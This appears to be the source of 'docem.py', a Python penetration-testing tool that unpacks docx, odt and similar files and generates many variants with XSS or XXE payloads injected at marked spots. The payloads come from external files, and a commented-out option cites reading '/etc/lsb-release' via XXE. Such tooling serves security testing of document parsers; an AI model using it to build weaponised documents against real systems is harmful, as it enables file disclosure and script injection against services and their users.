#!/usr/bin/python3

import os  
import shutil
import json
import uuid
import argparse
# To create random refernces to XXE
import string 
import random
# To work with XXE payloads
import json
import time

from lxml import etree, objectify

def make_tmp_clean_again(paths, mode):

	if mode ==  'original':
		if os.path.exists(paths['path_to_unzipped_folder_original']):
			shutil.rmtree(paths['path_to_unzipped_folder_original'])

		if os.path.exists(paths['path_to_copied_file']):
			os.remove(paths['path_to_copied_file'])

	elif mode == 'copy':

		if os.path.exists(paths['path_to_unzipped_folder_modified']):
			shutil.rmtree(paths['path_to_unzipped_folder_modified'])

		if os.path.exists(paths['path_to_modified_file']):
			os.remove(paths['path_to_modified_file'])

# STEP 0
def document_prepare_initial_paths(path_to_file):

	path_to_script =  os.path.dirname(os.path.relpath(__file__))
	path_to_tmp = path_to_script + '/tmp/'

	# That hack needed because I switched from full paths
	# to relevant; but I still want to have ability to use full paths
	# What it does is: if path_to_script = '' than we need to remove first
	# slash fro path_to_tmp 
	# but it might break something
	if path_to_tmp.find('tmp') == 1: path_to_tmp = 'tmp/'

	# Determine whether supplied path is a path to dir
	sample_type_is_folder = os.path.isdir(path_to_file)

	if sample_type_is_folder:

		# Check that sample_type is set
		# (Very dumb place for a check)
		if not args.sample_extension and sample_type_is_folder:
			print('\nError: You have to specify sample_type (example: -sx docx) when using sample from directory')
			exit()

		# If path was set as 'samples/xxe/sample_oxml_xxe_mod1/'
		if len(path_to_file) - 1 == path_to_file.rfind('/'):
			path_to_file = path_to_file[:-1]
		# If path was set as 'samples/xxe/sample_oxml_xxe_mod1' 
		# do nothing
		# samples/xxe/sample_oxml_xxe_mod1 - is our format

		original_file_name = path_to_file.split('/')[-1]
		original_file_ext = args.sample_extension

		path_to_copied_file = ''

	else:

		# Create separate variables for an original file
		original_file_name = path_to_file.split('/')[-1].split('.')[0]
		original_file_ext = path_to_file.split('/')[-1].split('.')[1]

		# create variables for a copied files
		path_to_copied_file = path_to_tmp + original_file_name + '.zip'

	# create variables for an unzipped files
	unzipped_file_name = original_file_name + '_' + original_file_ext
	path_to_unzipped_folder_original = path_to_tmp + unzipped_file_name + '/'


	paths_and_names = {
		"path_to_script" : path_to_script,
		"path_to_tmp" : path_to_tmp,
		"path_to_orignal_file" : path_to_file,
		"path_to_copied_file" : path_to_copied_file,
		"path_to_unzipped_folder_original" : path_to_unzipped_folder_original,
		"path_to_unzipped_folder_modified" : path_to_unzipped_folder_original,
		"original_file_name" : original_file_name,
		"original_file_ext" : original_file_ext,
		"unzipped_file_name" : unzipped_file_name,
		"modified_file_name" : original_file_name,
		"path_to_modified_file" : '',
		"sample_type_is_folder" : sample_type_is_folder
	}
	#print(paths_and_names)
	return(paths_and_names)

# Prepare path where document will be unzipped
def docuemnt_prepare_future_paths(paths, payload_type, payload_key, single_place='', offset=''):


	if payload_type == 'per_place':
		#postfix = '%s+%s'%(payload_type, payload) 
		postfix = '%s-%s-%s-%s'%(payload_type, single_place, payload_key, offset) 

	elif payload_type == 'per_file':
		#postfix = '%s-%s'%(payload_type, payload) 
		postfix = '%s-%s-%s'%(payload_type, single_place, payload_key) 

	elif payload_type == 'per_document':
		postfix = '%s-%s'%(payload_type, payload_key) 


	postfix += '_' + str(time.time()).replace('.','') 

	paths['modified_file_name'] = paths['original_file_name'] + '-' + postfix 
	paths['path_to_unzipped_folder_modified'] = paths['path_to_tmp'] + paths['modified_file_name'] + '/'
	paths['path_to_modified_file'] = paths['path_to_tmp'] + paths['modified_file_name'] + '.zip'
	paths['path_to_packetd_file'] = paths['path_to_tmp'] +  paths['modified_file_name'] + '.' +  paths['original_file_ext']

	# For debug	
	#print('postfix',postfix)
	#print("paths['original_file_name']",paths['original_file_name'])
	#print("paths['modified_file_name']", paths['modified_file_name'])
	#print("paths['path_to_unzipped_folder_modified']",paths['path_to_unzipped_folder_modified'])



# copy, rename and unzip
def document_unpack(paths):

	# If sample is a folder
	if paths['sample_type_is_folder']:
		shutil.copytree(paths["path_to_orignal_file"],paths["path_to_unzipped_folder_original"])

	# If sample is a .docx or smth
	else:
		# copy original file into script_script/dir and rename extension to .zip
		shutil.copy(paths["path_to_orignal_file"],paths["path_to_copied_file"])
		# unzip renamed file into direc
		shutil.unpack_archive(paths["path_to_copied_file"],paths["path_to_unzipped_folder_original"])
		# debug
		#print(paths["path_to_unzipped_folder_original"])
		

def document_tree_generate(paths, opt=1):
	files_inside_unpacked_dir = {}
	for root, dirs, files in os.walk(paths["path_to_unzipped_folder_original"], topdown = False):
		for full_name in files:
			#print(os.path.join(root, name))

			path_to_file = os.path.join(root, full_name)
			path_in_tmp = path_to_file.replace(paths["path_to_unzipped_folder_original"],'')

			# Remove extension from file
			full_name_extension_offset = full_name.rfind('.')
			if full_name_extension_offset != -1:
				name_without_extension = full_name[:full_name.rfind('.')].replace('.','_')
			else:
				name_without_extension = full_name

			#full_name = full_name.replace('.','_')
			#print('\nfull_name',full_name)
			# Construct future key_name for an array of files inside a document
			key_name = '%s_%s'%(root, name_without_extension)
			# Remove path to a docuemnt and strip '_' symbol for those docuemnts that lies in a root of a docuemnt 
			#print('key_name',key_name)
			#print('key_name',key_name.replace(paths["path_to_unzipped_folder_original"],''))
			#key_name = key_name.replace(paths["path_to_unzipped_folder_original"],'').lstrip('_')
			key_name = key_name.replace(paths["path_to_unzipped_folder_original"],'')
			#print('key_name',key_name)

			files_inside_unpacked_dir[key_name] = {'path': path_to_file, 'path_in_tmp': path_in_tmp}

	return(files_inside_unpacked_dir)


# Add tmp paths of copied unzipped tmp document
# to tree_embedding
def document_tree_embedding_append_mod_paths(paths, tree_embedding):

	n = 'document_tree_embedding_append'
	
	#print(n,'path_to_modified_file', paths['path_to_modified_file'])
	#print(n,'path_to_unzipped_folder_modified', paths['path_to_unzipped_folder_modified'])

	for file_to_embed in tree_embedding.keys():
		tree_embedding[file_to_embed]['tmp_mod_path'] = paths['path_to_unzipped_folder_modified'] + tree_embedding[file_to_embed]['path_in_tmp']
		#print(tree_embedding[file_to_embed]['tmp_mod_path'])


# Meta function 
# for all possbile embeddings
def document_embed_payloads(payload_mode,payload_type,single_file_dict, payload_single, magic_symbol,offset_in_single_file = 0):


	# payload_mode
	# payload_type
	# tree_embedding[single_file_key] = single_file_dict 
	# 	tree_embedding[single_file_key]['tmp_mod_path']
	# 	tree_embedding[single_file_key]['content']
	# magic_symbol
	# payloads[single_payload_key] = payload_single
	# offset_in_single_file = offset_in_single_file


	if payload_mode == 'xss':
		with open(single_file_dict['tmp_mod_path'],'w') as single_file:
	
			if payload_type == 'per_document' or payload_type == 'per_file':

				single_file_mod = single_file_dict['content'].replace(magic_symbol, payload_single)

			elif payload_type == 'per_place':

				single_file_mod = single_file_dict['content'][:offset_in_single_file] 

				single_file_mod += payload_single + single_file_dict['content'][offset_in_single_file+1:] 
				

				# Clear other places in a file
				single_file_mod = single_file_mod.replace(magic_symbol,'')

			single_file.write(single_file_mod)
			single_file.close()


	elif payload_mode == 'xxe':
		with open(single_file_dict['tmp_mod_path'],'w') as single_file:

			# Loading one payload to dict from string
			xxe_current_payload_dict = json.loads(payload_single)

			# If there is a reference
			# then substitute all magic symblos with references 
			if xxe_current_payload_dict['reference']:

				if payload_type == 'per_document' or payload_type == 'per_file':

					single_file_mod = single_file_dict['content'].replace(magic_symbol, xxe_current_payload_dict['reference'])

				elif payload_type == 'per_place': 

					single_file_mod = single_file_dict['content'][:offset_in_single_file] 
					single_file_mod += xxe_current_payload_dict['reference'] + single_file_dict['content'][offset_in_single_file+1:] 

					# Clear other places in a file
					single_file_mod = single_file_mod.replace(magic_symbol,'')	


			# If there is no reference
			# then delete all magic symblos
			else:
				single_file_mod = single_file_dict['content'].replace(magic_symbol,'')


			# Ending with finding where to place 
			# payload with <DOCTYPE and stuf>
			offset_xml_start = int(single_file_dict['content'].find('<?xml'))
			# find where the tag closes
			offset_xml_place_closed_bracket = single_file_dict['content'].find('>',offset_xml_start) + 1 

			single_file_mod = single_file_mod[:offset_xml_place_closed_bracket] + xxe_current_payload_dict['vector'] + single_file_mod[offset_xml_place_closed_bracket:]


			single_file.write(single_file_mod)
			single_file.close()

# STEP 4
# zip into archive and rename
def document_pack(paths):

	# Split - because shutil will add .zip anyway
	#print(paths['path_to_unzipped_folder_modified'])
	shutil.make_archive(base_name=paths['path_to_modified_file'].split('.')[0],root_dir=paths['path_to_unzipped_folder_modified'],format='zip')

	# For debug
	#print('\n%s'%paths['path_to_modified_file'])
	#print(paths['path_to_packetd_file'])

	# copy & rename zip to odt
	shutil.copy(paths['path_to_modified_file'], paths['path_to_packetd_file'])

	
def document_copy_dir(paths):

	shutil.copytree(paths['path_to_unzipped_folder_original'], paths['path_to_unzipped_folder_modified'])


# 
# tree embeding structure
# { 
# 	'file1':{
# 		'tmp_mod_path':'',
# 		'places':[], 
# 		'path':'',
# 		'content':'',
# 		'path_in_tmp':'',
# 		'count':''
# 	},
# 	'file2':{

# 	},
# 	'file3':{

# 	},
# 	etc.
# }
def document_tree_embedding_points(paths, tree, magic_symbol):

	print('\n======== Count magic symbols ========')

	count_places = 0
	
	embedding = []
	tree_embedding = {}

	embedding_info = {}
	# For every document in a tree
	for file_key_name in tree.keys():
		# Read file and find all places 
		file_in_sample_path = tree[file_key_name]['path']

		#print(file_in_sample_path)
		if file_in_sample_path.endswith(('.xml','.txt','.rels','.vml')):
			with open(file_in_sample_path, 'r') as file_in_sample:
				file_in_sample_read = file_in_sample.read()
				file_in_sample.close()

				embedding_count = file_in_sample_read.count(magic_symbol)

				#tree_embedding will be consist only with those files does have magic symbols
				if embedding_count != 0:

					tree_embedding[file_key_name] = dict(tree[file_key_name])
					tree_embedding[file_key_name]['count'] =  embedding_count
					tree_embedding[file_key_name]['places'] = [index for index in range(len(file_in_sample_read)) if file_in_sample_read.startswith(magic_symbol, index)]	
					tree_embedding[file_key_name]['content'] = file_in_sample_read

					count_places += len(tree_embedding[file_key_name]['places'])
				print('\t%d\tsymbols in %s'%(embedding_count,file_key_name))


	embedding_info['num_of_files_to_embed'] = len(tree_embedding)
	embedding_info['num_of_places_to_embed'] = count_places

	#print('\n\t%d\ttotal files to embed' % len(tree_embedding))
	#print('\t%d\ttotal places to embed' % count_places)
	return(tree_embedding,embedding_info)

def payloads_read_file(path_to_payloads):

	payloads = {}

	with open(path_to_payloads, 'r') as payload_vectors_file:
		payload_vectors_file_read = payload_vectors_file.read().splitlines()

	payloads_number = len(payload_vectors_file_read)
	for p in range(payloads_number):
		payloads['payload_%d' % p] = payload_vectors_file_read[p]

	return(payloads)

def make_embedding_tree_clear_again(tree_embedding, current_file_key):

	to_clear_files = dict(tree_embedding)
	del(to_clear_files[current_file_key])

	# for debug
	#print(tree_embedding.keys())
	#print(to_clear_files.keys())
	
	for to_clear_file_key in to_clear_files.keys():
		cleared_file_content = to_clear_files[to_clear_file_key]['content'].replace(magic_symbol,'')

		with open(to_clear_files[to_clear_file_key]['tmp_mod_path'],'w') as cleared_file:
			cleared_file.write(cleared_file_content)
			cleared_file.close()

def interface_ask_user(embedding_info,paths):

	# embedding_info['num_of_files_to_embed'] = len(tree_embedding)
	# embedding_info['num_of_places_to_embed'] = len(tree_embedding)

	print('\n\t%d\ttotal files to embed (used as modifier with -pt per_file)' % embedding_info['num_of_files_to_embed'])
	print('\t%d\tplaces in a doc file to embed (used as modifier with -pt per_place)' % embedding_info['num_of_places_to_embed'])

	num_of_payloads = embedding_info['num_of_payloads']

	# modifier depends on payload_type (-pt)
	modifier = 1	

	if embedding_info['payload_type'] == 'per_file':
		modifier = embedding_info['num_of_files_to_embed']

	elif embedding_info['payload_type'] == 'per_place':
		modifier = embedding_info['num_of_places_to_embed']

	num_of_files_result = num_of_payloads * modifier

	print('\nnum_of_payloads * modifier = %d * %d = %d'%(num_of_payloads,modifier,num_of_files_result))
	print('modifier depends on payload_type (-pt)')
	print('\nFiles to be created %d' % num_of_files_result)

	# To be sure that you want to create that amount of documents
	answer = input('Continue?(y/n): ')
	
	if answer == 'n':
		make_tmp_clean_again(paths,'original')
		exit()


def interface_print_logo():
	logo = '''

_|_|_|                                                  
_|    _|    _|_|      _|_|_|    _|_|    _|_|_|  _|_|    
_|    _|  _|    _|  _|        _|_|_|_|  _|    _|    _|  
_|    _|  _|    _|  _|        _|        _|    _|    _|  
_|_|_|      _|_|      _|_|_|    _|_|_|  _|    _|    _|  
                                                                                                        
	'''
	version = '1.3'
	print(logo)
	print('Current version: %s\n'%version)

def interface_print_example():
	examples = 	[
		'./docem.py -s samples/xxe/docx_sample_oxml_xxe_mod0/ -pm xss -pf payloads/xxe_special_6.txt -pt per_document -kt -sx docx',
		'./docem.py -s samples/xxe/docx_sample_oxml_xxe_mod1/ -pm xss -pf payloads/xxe_special_1.txt -pt per_file -kt -sx docx',
		'./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place',
		'./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place'
	]
	
	print('Examples:\n%s\n' % '\n'.join(e for e in examples))

if __name__ == '__main__':

	interface_print_logo()
	interface_print_example()

	# Working with arguments
	parser = argparse.ArgumentParser(description='Create docx,odt,pptx,etc files with XXE/XSS payloads')
	
	optional = parser._action_groups.pop()
	required = parser.add_argument_group('required arguments')
	
	required.add_argument('-s', dest='sample', type=str, help='path to sample file')
	required.add_argument('-pm', dest='payload_mode',type=str,choices=['xss','xxe'],help='payload mode: embedding XXE or XSS in a file')

	#optional.add_argument('-xu', dest='xxe_uri', type=str, help='URI to use in XXE payload - file as \'file:///etc/lsb-release\' or url as \'http://example.com\'')
	optional.add_argument('-kt', dest='keep_tmp', action='store_true', help='do not delete unpacked and modified folders')
	optional.add_argument('-pt', dest='payload_type', type=str, help='how many payloads will be in one file. per_document is default',choices=['per_place','per_file','per_document'],default='per_document')
	#optional.add_argument('-st', dest='sample_type', type=str, help='d ',choices=['doc','folder'],default='doc')
	optional.add_argument('-sx', dest='sample_extension', type=str, help='d ')
	optional.add_argument('-pf', dest='payload_file',type=str, help='path to a file with payloads to embed',default='payloads/no_payload.txt')

	parser._action_groups.append(optional)
	args = parser.parse_args()	

	# Symbol that is used to determine a place where to place payload
	magic_symbol = 'XXCb8bBA9XX'

	path_to_complex_file = args.sample
	
	if args.sample:

		if os.path.exists(args.sample) and os.path.exists(args.payload_file):
			print('Document Embed XSS & XXE tool')
			
			print('\nCurrent magic_symbol: ',magic_symbol)

			payloads = payloads_read_file(args.payload_file)

			# Create dict with a lot of file paths that will be used 
			# in future
			paths = document_prepare_initial_paths(path_to_complex_file)
			
			# For dubug
			#print('\npaths in the beginning\n',paths)

			# Create tmp directory if it is not exists
			if not os.path.exists(paths["path_to_tmp"]):
				os.mkdir(paths["path_to_tmp"])

			print('\n=========== Current setup ===========')
			print('sample file path:\t\t',args.sample)
			print('sample is a directory:\t',paths['sample_type_is_folder'])
			print('payload mode:\t\t',args.payload_mode)
			print('payload file:\t\t',args.payload_file)
			print('payload type:\t\t',args.payload_type)
			print('number of payloads:\t',len(payloads))
			print('keep unpacked files:\t',args.keep_tmp)

			document_unpack(paths)
			tree = document_tree_generate(paths)
			tree_embedding, embedding_info = document_tree_embedding_points(paths, tree, magic_symbol)
			embedding_info['num_of_payloads'] = len(payloads)
			embedding_info['payload_type'] = args.payload_type

			#make_tmp_clean_again(paths,'original')
			interface_ask_user(embedding_info,paths)

			# Starting maing cycle
			for single_payload_key in payloads.keys():

				print('\n%s' % single_payload_key)

				if args.payload_type == 'per_document':
					
					docuemnt_prepare_future_paths(paths, args.payload_type, single_payload_key)
					document_tree_embedding_append_mod_paths(paths, tree_embedding)
					document_copy_dir(paths)

					
					# For 'per_document' we are looking only
					# for those documents that have embedded magic symbols
					# and we do not need to clear anything
					# because all magic symbols will be substituted
					for single_file_key in tree_embedding:

						document_embed_payloads(
							payload_mode = args.payload_mode,
							payload_type = args.payload_type,
							single_file_dict = tree_embedding[single_file_key],
							payload_single = payloads[single_payload_key],
							magic_symbol = magic_symbol
							)


					document_pack(paths)

					print('\tpacked to: %s' % paths['path_to_packetd_file'])

					if not args.keep_tmp: 			
						make_tmp_clean_again(paths,'copy')

				elif args.payload_type == 'per_file':
	
					for single_file_key in tree_embedding:
	
						print('\t%s'%single_file_key)

						docuemnt_prepare_future_paths(paths, args.payload_type, single_payload_key, single_file_key)
						document_tree_embedding_append_mod_paths(paths, tree_embedding)						
						document_copy_dir(paths)


						document_embed_payloads(
							payload_mode = args.payload_mode,
							payload_type = args.payload_type,
							single_file_dict = tree_embedding[single_file_key],
							payload_single = payloads[single_payload_key],
							magic_symbol = magic_symbol
							)

						make_embedding_tree_clear_again(tree_embedding, single_file_key)
						document_pack(paths)
						
						print('\t\tpacked to: %s'%paths['path_to_packetd_file'])

						if not args.keep_tmp:
							make_tmp_clean_again(paths,'copy')

				elif args.payload_type == 'per_place':

					for single_file_key in tree_embedding:

						print('\t%s'%single_file_key)
					
						for offset_in_single_file in tree_embedding[single_file_key]['places']:

							docuemnt_prepare_future_paths(paths, args.payload_type, single_payload_key, single_file_key, offset_in_single_file)
							document_tree_embedding_append_mod_paths(paths, tree_embedding)
							document_copy_dir(paths)

							#print('\n',tree_embedding[single_file_key]['path_in_tmp'])

							document_embed_payloads(
								payload_mode = args.payload_mode,
								payload_type = args.payload_type,
								single_file_dict = tree_embedding[single_file_key],
								payload_single = payloads[single_payload_key],
								magic_symbol = magic_symbol,
								offset_in_single_file = offset_in_single_file
							)

							make_embedding_tree_clear_again(tree_embedding, single_file_key)
							document_pack(paths)

							print('\t\tpacked to: %s'%paths['path_to_packetd_file'])
						
							if not args.keep_tmp: 			
								make_tmp_clean_again(paths,'copy')

					if not args.keep_tmp: 			
						make_tmp_clean_again(paths,'copy')

			make_tmp_clean_again(paths,'original')
					
		else:
			print("Error: One of specified files: '%s' or '%s' - does not exist"% (args.sample, args.payload_file))
	else:
		parser.print_help()